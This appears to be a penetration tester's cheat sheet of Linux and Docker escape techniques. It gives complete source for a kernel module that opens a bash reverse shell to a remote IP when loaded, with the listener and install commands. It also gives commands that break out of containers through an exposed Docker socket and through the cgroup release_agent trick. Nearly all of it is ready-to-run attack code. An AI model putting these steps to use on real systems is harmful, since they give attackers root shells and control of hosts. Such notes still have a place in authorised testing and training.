# General notes

## Linux
Kernel module:
- Makefile
```
obj-m +=kmod-rshell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
- kmod-rshell.c
```
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("someone");

char* argv[] =
  {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.10.10/12345 0>&1", NULL};
static char* envp[] =
  {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static int __init rshell_init(void) {
  return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit rshell_exit(void) {
  printk(KERN_INFO "Exiting\n");
}

module_init(rshell_init);
module_exit(rshell_exit);
```
- listen
```
nc -nvlp 12345
```
- install
```
insmod kmod-rshell.ko
```

## Docker
Get capabilities provided (inside container):
```
capsh --print

```
Unprotected TCP socket:
```
docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
```

Container mounted Docker socket:
```
docker run -v /:/host_root -ti alpine /bin/sh
```

Run command leveraging cgroup:
```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`;
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release;
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`;
touch /o;
echo $t/c >$d/release_agent;
printf '#!/bin/sh\nps >'"$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";
sleep 1;
cat /o;
```
